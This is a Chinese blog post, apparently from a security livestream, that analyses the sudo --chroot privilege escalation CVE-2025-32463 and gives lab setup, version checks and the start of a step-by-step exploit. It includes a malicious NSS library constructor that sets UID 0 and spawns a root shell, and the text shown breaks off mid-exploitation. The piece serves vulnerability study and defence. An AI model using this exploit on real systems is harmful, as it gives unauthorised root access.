

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/Yaney.jpg">
  <link rel="icon" href="/img/lizi.svg">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Yaney">
  <meta name="keywords" content="">
  
    <meta name="description" content="本文是笔者在腾讯云开发者先锋（简称 TDP）的直播内容，可关注视频号【腾云先锋】查看直播回放。读完本文，您不仅能对 CVE-2025-32463 漏洞有个全面的认知，还能对容器的沙箱隔离有个初步的了解。">
<meta property="og:type" content="article">
<meta property="og:title" content="从 CVE-2025-32463 谈及 chroot 的容器隔离安全性">
<meta property="og:url" content="http://example.com/2025/07/30/%E4%BB%8E-CVE-2025-32463-%E8%B0%88%E5%8F%8A-chroot-%E7%9A%84%E5%AE%B9%E5%99%A8%E9%9A%94%E7%A6%BB%E5%AE%89%E5%85%A8%E6%80%A7/index.html">
<meta property="og:site_name" content="Yaney&#39;s Blog">
<meta property="og:description" content="本文是笔者在腾讯云开发者先锋（简称 TDP）的直播内容，可关注视频号【腾云先锋】查看直播回放。读完本文，您不仅能对 CVE-2025-32463 漏洞有个全面的认知，还能对容器的沙箱隔离有个初步的了解。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/image/chroot.png">
<meta property="article:published_time" content="2025-07-30T09:07:29.000Z">
<meta property="article:modified_time" content="2025-08-05T05:36:58.107Z">
<meta property="article:author" content="Yaney">
<meta property="article:tag" content="容器安全">
<meta property="article:tag" content="CVE 漏洞分析">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/image/chroot.png">
  
  
  
  <title>从 CVE-2025-32463 谈及 chroot 的容器隔离安全性 - Yaney&#39;s Blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"Bash"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":6},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  

  

  

  



  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Yaney&#39;s Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/image/chroot.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="从 CVE-2025-32463 谈及 chroot 的容器隔离安全性"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-07-30 17:07" pubdate>
          2025年7月30日 下午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          8.8k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          73 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">从 CVE-2025-32463 谈及 chroot 的容器隔离安全性</h1>
            
              <p id="updated-time" class="note note-info" style="">
                
                  
                    本文最后更新于 2025年8月5日 下午
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>2025 年 6 月，<code>sudo</code> 被曝史诗级本地提权漏洞 CVE-2025-32463。本文用不仅提供了容器化漏洞复现环境，可一键启动漏洞环境并运行 PoC 脚本直取 <code>root</code> 权限；还能手把手教您攻防细节，提高个人技术水平并学习企业级别的应用防护知识。此外，本文还附赠容器底层技术原理，了解容器是如何通过 <code>--chroot</code> 实现根文件系统切换的？其隔离性如何？</p>
<p>本文是笔者在腾讯云开发者先锋（简称 TDP）的直播内容，可关注视频号【腾云先锋】查看直播回放。读完本文，您不仅能对 CVE-2025-32463 漏洞有个全面的认知，还能对容器的沙箱隔离有个初步的了解。</p>
<p><img src="/image/image_xZJ3pkERK7.png" srcset="/img/loading.gif" lazyload alt="图 1：直播回放查看通道" title="图 1：直播回放查看通道"></p>
<h2 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h2><p>在开始本次分享之前，我们需要简要了解一些技术背景知识，以便在后续的漏洞解析和 <code>chroot</code> 安全性评估中能够更好地理解内容：</p>
<ul>
<li>什么是 <code>sudo</code> ；</li>
<li>什么是 <code>chroot</code> ；</li>
<li><code>sudo</code> 的 <code>--chroot</code> 参数有何作用。</li>
</ul>
<h3 id="1-1-sudo-简介"><a href="#1-1-sudo-简介" class="headerlink" title="1.1 sudo 简介"></a>1.1 sudo 简介</h3><p><code>sudo</code> 的全称是“superuser do”，意思是能够以超级用户的身份执行命令。<code>sudo</code> 允许用户在不共享 <code>root</code> 密码的情况下，暂时以 <code>root</code> 权限执行命令并记录这些操作以方便问责。</p>
<p>如图 2 所示，<code>yaney</code> 用户可通过 <code>sudo</code> 命令，在执行命令时暂时将权限提升至 <code>root</code>，而且我们可以查看<code>/var/log/auth.log</code> 文件，了解 <code>sudo</code> 执行的命令、时间和用户等信息，这对于日志审计和攻击溯源来说是非常有用的。</p>
<p><img src="/image/image_oerGcu_F5X.png" srcset="/img/loading.gif" lazyload alt="图 2：sudo 的主要功能演示" title="图 2： sudo 的主要功能演示"></p>
<h3 id="1-2-chroot-简介"><a href="#1-2-chroot-简介" class="headerlink" title="1.2 chroot 简介"></a>1.2 chroot 简介</h3><p><code>chroot</code> 主要的功能就是更改当前进程的根目录。当根目录被更改后，当前进程及其子进程只能访问比新根目录层次更低的文件和目录。例如：若主机上存在以下目录和文件：</p>
<ul>
<li>&#x2F;some&#x2F;directory&#x2F;on&#x2F;host&#x2F;file1</li>
<li>&#x2F;some&#x2F;directory&#x2F;on&#x2F;host&#x2F;dir1&#x2F;file2</li>
</ul>
<p>当我们将当前进程的根目录指向 <code>/some/directory/on/host</code> 时，当前进程的最高文件层级就被设置为 <code>/some/directory/on/host</code> ，这样一来，除了以下文件和目录，我们将无法访问其它任一文件层级：</p>
<ul>
<li>&#x2F;file1</li>
<li>&#x2F;dir1&#x2F;file2</li>
</ul>
<p>查看 <code>chroot</code> 手册时，我们可以了解到：<code>chroot</code> 不仅可以更改根目录，还能执行命令。若没有指定命令，则默认以可交互的方式执行系统所设置的 SHELL。</p>
<p><img src="/image/image_FgzZgRFeRe.png" srcset="/img/loading.gif" lazyload alt="图 3：chroot 的手册" title="图 3： chroot 的手册"></p>
<p>如图 4 所示，当我们创建一个没有任何内容的新目录<code>new_root</code>并 <code>chroot</code> 到该目录中时，无论我们是否追加命令，都会运行失败。根据报错信息，我们知道，这是因为 <code>new_root</code> 目录并未包含<code>/bin/bash</code> 文件，也无法找到 <code>ls</code> 等命令。为了解决这个问题，我们需要将所要运行的命令文件放在 <code>new_root</code> 目录中。</p>
<p><img src="/image/image_PJ-R6fO4VM.png" srcset="/img/loading.gif" lazyload alt="图 4：chroot 的主要功能演示" title="图 4： chroot 的主要功能演示"></p>
<p>在 SFTP&#x2F;FTP 的使用场景中，我们若想用户在文件传输期间仅能访问主目录，通常使用 <code>chroot</code> 将 FTP 进程的根目录设置为<code>/home/user</code>，以防止恶意用户访问<code>/etc/passwd</code>等敏感文件。</p>
<p>但 <code>chroot</code>不隔离内核能力、不清理环境变量、以及不屏蔽系统调用权限，导致用户仍然可以通过各种方式打破隔离，我们将本文的第三部分对 <code>chroot</code> 的隔离进行安全评估。</p>
<h3 id="1-3-sudo-的-–chroot-参数"><a href="#1-3-sudo-的-–chroot-参数" class="headerlink" title="1.3 sudo 的 –chroot 参数"></a>1.3 sudo 的 –chroot 参数</h3><p>在大多数系统中，<code>chroot</code> 命令需要以 <code>root</code> 权限执行。若普通用户需要使用 <code>chroot</code> 命令，我们需要授予其 <code>root</code> 权限，但这严重违反了最小权限原则。当然，我们也可以通过 <code>sudo</code> 执行 <code>chroot</code> 命令（即 <code>sudo chroot</code>），但这仍然给予了普通用户完整的 <code>root</code> 权限。例如，我们可以执行下述命令 <code>chroot</code> 到某个目录中。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">chroot</span> /path/to/dir /bin/bash<br></code></pre></td></tr></table></figure>

<p>但实际上 <code>chroot</code>只是将当前进程的根目录更改为我们所设置的路径<code>/path/to/dir</code>，然后以 <code>root</code> 权限执行 <code>/bin/bash</code>，这样一来，我们就在新的根目录下以 <code>root</code> 权限执行任何命令。如果目标目录是用户控制的，风险会更大。</p>
<p>2020 年 9 月 29 日，<code>sudo</code>在 1.9.3 版本中引入了 <code>--chroot</code> 参数，这样一来，我们就可以将目标目录限制在单个目录中了，详情请看 <code>sudo</code> 的<a target="_blank" rel="noopener" href="https://www.sudo.ws/releases/stable/#1.9.3" title="发版记录">发版记录</a>。</p>
<p><img src="/image/image_yfvH8U0Gux.png" srcset="/img/loading.gif" lazyload alt="图 5：sudo 的 --chroot 参数" title="图5： sudo 的 --chroot 参数"></p>
<p><code>sudo</code> 的内置的 <code>--chroot</code> 功能默认不启用，我们必须在 <code>sudoers</code> 文件中明确启用。此外，无论 <code>--chroot</code>是否运行成功，<code>sudo</code> 都会详细记录在日志中，这对于日志审计和攻击溯源特别有用，详情请看官方博客<a target="_blank" rel="noopener" href="https://www.sudo.ws/posts/2020/09/using-chroot-and-cwd-in-sudo/" title="《Using chroot and cwd in sudo》">《Using chroot and cwd in sudo》</a>。</p>
<p><img src="/image/image_yVJ1S-PQA1.png" srcset="/img/loading.gif" lazyload alt="图 6：sudo --chroot 的官方使用手册" title="图6： sudo --chroot 的官方使用手册"></p>
<h2 id="0x02-CVE-2025-32463-漏洞解析"><a href="#0x02-CVE-2025-32463-漏洞解析" class="headerlink" title="0x02 CVE-2025-32463 漏洞解析"></a>0x02 CVE-2025-32463 漏洞解析</h2><p>有了第一部分的知识回顾，现在我们就可以对 CVE-2025-32463 漏洞进行深入解析了，解析内容包括：</p>
<ul>
<li>如何对漏洞的大致情况进行简单地描述；</li>
<li>如何快速启动漏洞环境并进行漏洞利用；</li>
<li>如何快速验证当前环境是否受漏洞影响；</li>
<li>如何搭建漏洞环境并一步步地进行漏洞利用；</li>
<li>如何对公司资产进行影响面排查；</li>
<li>如何对资产的环境进行排查；</li>
<li>如何从源码层面分析漏洞的成因以及修复措施。</li>
</ul>
<h3 id="2-1-漏洞描述"><a href="#2-1-漏洞描述" class="headerlink" title="2.1 漏洞描述"></a>2.1 漏洞描述</h3><p>2025 年 6 月 30 日，<a target="_blank" rel="noopener" href="https://www.stratascale.com/" title="Stratascale">Stratascale</a> 网络研究部门 (CRU) 的 <a target="_blank" rel="noopener" href="https://x.com/0xm1rch" title="Rich Mirch">Rich Mirch</a>在 <code>sudo</code> 中发现了两个权限提升漏洞，均可将系统权限提升到 <code>root</code> 权限，分别是：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.stratascale.com/vulnerability-alert-CVE-2025-32462-sudo-host" title="《CVE-2025-32462：sudo 的 --host 权限提升漏洞》">《CVE-2025-32462：sudo 的 –host 权限提升漏洞》</a></li>
<li><a target="_blank" rel="noopener" href="https://www.stratascale.com/vulnerability-alert-CVE-2025-32463-sudo-chroot" title="《CVE-2025-32463：sudo 的 --chroot 权限提升漏洞》">《CVE-2025-32463：sudo 的 –chroot 权限提升漏洞》</a></li>
</ul>
<p><code>--host</code> 和 <code>--chroot</code> 都是 <code>sudo</code> 中不常用的参数，而本次分享我们只讨论其中的 CVE-2025-32463 漏洞，该漏洞无需定义任何 <code>sudo</code> 规则，即可将普通用户的权限提升至 <code>root</code> 权限，我们将在本文的【2.2 快速开始】中说明，如何一键启动漏洞环境，并使用其中的 PoC 脚本快速提权。</p>
<p>根据最初的安全公告数据，已明确得知 <code>sudo</code>的 1.9.14 至 1.9.17 版本均受其影响，但并非所有版本都经过测试。我们将在本文的【2.3 漏洞验证】中说明，如何快速验证漏洞是否存在。</p>
<p>此外，我们将在本文的【2.4 环境搭建】和【2.5 漏洞利用】中实操一遍攻击流程：</p>
<ul>
<li>攻击者自定义<code>/etc/nsswitch.conf</code>配置文件内容，诱导 <code>sudo</code> 加载指定根目录下的恶意动态链接库；</li>
<li>然后使用 <code>sudo</code> 的 <code>--chroot</code> 参数切换到 <code>chroot</code> 环境，自动加载恶意动态链接库，从而实现以 <code>root</code> 权限执行任意命令。</li>
</ul>
<p>该漏洞已在 1.9.17p1 中得到了修复，因此请安装<code>sudo</code> 1.9.17p1 或更高版本。我们会在【2.6 影响面排查】中详细说明，如何快速对各种企业资产进行影响面排查，以及常见的误区是什么。</p>
<p>若影响面排查无法生效，那么我们需要对当前环境进行排查，详情请看【2.7 环境排查】。若这些内容对于您来说太简单了，并且还想对漏洞进行深入的分析和研究，我们将在【2.8 源码分析】中进行详细说明。</p>
<h3 id="2-2-快速开始"><a href="#2-2-快速开始" class="headerlink" title="2.2 快速开始"></a>2.2 快速开始</h3><p>如图 7 所示，为了方便所有人都可以一键进行漏洞复现，不用担心环境的问题。我已经将漏洞环境和 PoC 打包成容器镜像，方便大家操作。</p>
<p><img src="/image/image_iGbGssSCye.png" srcset="/img/loading.gif" lazyload alt="图 7：受漏洞影响的容器镜像环境" title="图7：受漏洞影响的容器镜像环境"></p>
<p>镜像共有<code>deb</code> 和 <code>source</code> 两个版本，其中 <code>deb</code> 版本的 <code>sudo</code> 是基于 <code>deb</code> 包安装的，<code>source</code> 版本的 <code>sudo</code>是基于源码自行构建的。这两个版本的漏洞复现效果都相同，我们随意拉取其中一个即可。</p>
<ol>
<li><p>随意拉取其中一个版本的镜像到本地运行；</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -it --<span class="hljs-built_in">rm</span> y4ney/cve-2025-32463-lab:<span class="hljs-built_in">source</span> bash<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -it --<span class="hljs-built_in">rm</span> y4ney/cve-2025-32463-lab:deb bash<br></code></pre></td></tr></table></figure>
</li>
<li><p>执行工作目录下的 PoC 脚本。该脚本可以追加任何命令，若不追加任何命令，则默认打开一个交互式的 <code>bash</code> ；</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">./sudo-chwoot.sh <span class="hljs-built_in">id</span><br>./sudo-chwoot.sh <br></code></pre></td></tr></table></figure>
</li>
<li><p>由于我们在启动容器的时候添加了 <code>--rm</code> 参数，所以使用 <code>exit</code> 退出容器环境中过后，容器会自动销毁。若要删除镜像，执行下述命令即可。</p>
<figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs docker">docker rmi y4ney/cve-<span class="hljs-number">2025</span>-<span class="hljs-number">32463</span>-lab:source<br></code></pre></td></tr></table></figure>

<figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs docker">docker rmi y4ney/cve-<span class="hljs-number">2025</span>-<span class="hljs-number">32463</span>-lab:deb<br></code></pre></td></tr></table></figure></li>
</ol>
<p><img src="/image/image_431f2OMa-_.png" srcset="/img/loading.gif" lazyload alt="图 8：漏洞利用流程" title="图8：漏洞利用流程"></p>
<p>若要自行构建镜像，详情请看我刚刚创建的项目<a target="_blank" rel="noopener" href="https://github.com/y4ney/CVE-2025-32463-lab" title="CVE-2025-32463-lab">CVE-2025-32463-lab</a>的 README，该镜像 fork 自 <a target="_blank" rel="noopener" href="https://github.com/pr0v3rbs/CVE-2025-32463_chwoot" title="pr0v3rbs&#x2F;CVE-2025-32463_chwoot">pr0v3rbs&#x2F;CVE-2025-32463_chwoot</a> 项目，进行了一定地改造。</p>
<p><img src="/image/image_IXsDe1VMyI.png" srcset="/img/loading.gif" lazyload alt="图 9：CVE-2025-32463-lab 项目描述" title="图9：CVE-2025-32463-lab 项目描述"></p>
<h3 id="2-3-漏洞验证"><a href="#2-3-漏洞验证" class="headerlink" title="2.3 漏洞验证"></a>2.3 漏洞验证</h3><p>我们可以通过执行下述命令，切换到一个不存在的目录中并执行一个不存在的命令，来快速验证漏洞是否存在。如图 10 所示，我们可以执行 <code>sudo -R hacker hacker</code>命令来判断漏洞是否存在：</p>
<ul>
<li>若当前的<code>sudo</code> 的版本为受影响版本 <code>1.9.15p5-3ubuntu5</code>，那么命令执行报错；</li>
<li>若当前的<code>sudo</code>的版本为不受影响版本<code>1.9.15p5-3ubuntu5.24.04.1</code>，那么命令执行过后，会要求我们输入用户密码。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -R /does/not/exist fakecmd fakecmd<br></code></pre></td></tr></table></figure>

<p><img src="/image/image_m2E-ZF3QDc.png" srcset="/img/loading.gif" lazyload alt="图 10：漏洞验证流程" title="图 10：漏洞验证流程"></p>
<h3 id="2-4-环境搭建"><a href="#2-4-环境搭建" class="headerlink" title="2.4 环境搭建"></a>2.4 环境搭建</h3><p>接下来，我们手把手教学：如何通过容器快速搭建漏洞环境。本次漏洞复现将在 ubuntu24.04 容器镜像中完成。执行下述命令，马上开启我们的旅程吧。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -it --<span class="hljs-built_in">rm</span> ubuntu:24.04 bash<br></code></pre></td></tr></table></figure>

<p>为了保持精简，Ubuntu、Debian 和 Alpine 等多种基础镜像都不预装 <code>sudo</code>，且<code>apt</code>和<code>yum</code>等系统包管理工具安装的 <code>sudo</code> 可能会被二次修改（例如打上了安全补丁、禁用了某些选项等），这可能导致漏洞无法复现或者是行为不一致。</p>
<p>所以我们需要基于源码，自行构建并安装一个受影响版本的<code>sudo</code>。此外，还需要创建一个用于安全测试的普通用户，例如 <code>yaney</code>。具体步骤如下：</p>
<ol>
<li><p>安装 <code>sudo</code> 依赖库、编译工具链和源码下载工具；</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-get update<br>apt-get install -y wget ca-certificates build-essential pkg-config libpam0g-dev libselinux1-dev zlib1g-dev  libssl-dev <br></code></pre></td></tr></table></figure>

<ul>
<li>源码下载工具：用于从官网获取<code>sudo</code> 源码并通过 HTTPS 安全下载。包括：<code>wget</code>,<code>ca-certificates</code>；</li>
<li>编译工具链：用于从源码构建 <code>sudo</code>，包括编译器、构建系统和依赖检测工具。包括：<code>build-essential</code>、<code>pkg-config</code>；</li>
<li>sudo 依赖库：提供认证、安全上下文、压缩和加密等<code>sudo</code> 所需的基础功能支持。包括：<code>libpam0g-dev</code>,<code>libselinux1-dev</code>,<code>zlib1g-dev</code>,<code>libssl-dev</code>。</li>
</ul>
</li>
<li><p>清理 apt 缓存，减小镜像体积；</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> -rf /var/lib/apt/lists/*<br></code></pre></td></tr></table></figure>
</li>
<li><p>切换到<code>/opt</code> 目录，该目录一般用于存放第三方源码或程序，非常适合存放 <code>sudo</code> 的源码。然后下载并解压<code>sudo</code>的源代码压缩包（版本为<code>1.9.16p2</code>）；</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /opt<br>wget https://www.sudo.ws/dist/sudo-1.9.16p2.tar.gz<br>tar xzf sudo-1.9.16p2.tar.gz<br></code></pre></td></tr></table></figure>
</li>
<li><p>编译并安装 <code>sudo</code>；</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> sudo-1.9.16p2 <br><span class="hljs-comment"># 预编译。不启用 libgcrypt 支持，构建完成后将程序安装到 /usr 目录下。</span><br>./configure --disable-gcrypt --prefix=/usr<br><span class="hljs-comment"># 编译</span><br>make<br><span class="hljs-comment"># 安装</span><br>make install<br></code></pre></td></tr></table></figure>
</li>
<li><p>新创建一个普通的安全测试用户并切换，例如<code>yaney</code>。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">useradd -m -s /bin/bash yaney<br>su yaney<br></code></pre></td></tr></table></figure>

<ul>
<li><code>-m</code>：自动创建用户的 home 目录<code>/home/yaney</code>；</li>
<li><code>-s /bin/bash</code>：指定默认 SHELL 为 <code>bash</code>。</li>
</ul>
</li>
</ol>
<h3 id="2-5-漏洞利用"><a href="#2-5-漏洞利用" class="headerlink" title="2.5 漏洞利用"></a>2.5 漏洞利用</h3><p>准备好环境过后，我们就可以快速进行漏洞利用了，这个过程非常简单，让我们来试一试吧。</p>
<h4 id="步骤一：准备攻击环境"><a href="#步骤一：准备攻击环境" class="headerlink" title="步骤一：准备攻击环境"></a>步骤一：准备攻击环境</h4><ol>
<li><p>创建一个用于构造攻击环境的临时目录，这个临时目录在使用结束过后，系统会自行删除。需要注意的是：<code>XXXXXX</code>是特殊标记，告诉<code>mktemp</code>将其替换成随机字符（通常是 6 个字母&#x2F;数字）。所以我们进入该目录的时候，<code>XXXXXX</code>需要替换成实际的字符串；</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mktemp</span> -d /tmp/sudochroot.stage.XXXXXX<br><span class="hljs-built_in">cd</span> /tmp/sudochroot.stage.XXXXXX<br></code></pre></td></tr></table></figure>
</li>
<li><p>&#x20;写入带有构造函数<code>hacker</code>的 C 代码，实现一旦加载就提权执行（libnss 插件）。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">cat &gt; hacker.c &lt;&lt;EOF<br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br>__attribute__((constructor)) <span class="hljs-type">void</span> <span class="hljs-title function_">hacker</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>  setreuid(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>  setregid(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>  chdir(<span class="hljs-string">&quot;/&quot;</span>);<br>  execl(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br>EOF<br><br></code></pre></td></tr></table></figure>

<ul>
<li>攻击脚本需要包含构造函数<code>__attribute__((constructor))</code>，与主函数<code>main()</code>需要手动触发不一样，构造函数在共享库被加载时就会自动执行。这样我们后续编译的<code>.so</code>文件在被加载时就能直接运行恶意代码了；</li>
<li>将有效 UID&#x2F;GID 和真实 UID&#x2F;GID 都设置为 <code>0</code>，即切换到<code>root</code> 用户。之所以这么设置，是因为一些系统调用或者操作仍然依赖于有效 UID&#x2F;GID 或真实 UID&#x2F;GID 是为 0；</li>
<li>切换当前工作目录到<code>/</code>，避免当前目录被删、影响 shell 工作；</li>
<li>重新打开一个新的 <code>bash</code> 。</li>
</ul>
</li>
</ol>
<h4 id="步骤二：构造-chroot-文件系统结构"><a href="#步骤二：构造-chroot-文件系统结构" class="headerlink" title="步骤二：构造 chroot 文件系统结构"></a>步骤二：构造 chroot 文件系统结构</h4><ol>
<li><p>创建攻击目录结构；</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p hacker/etc libnss_<br></code></pre></td></tr></table></figure>

<ul>
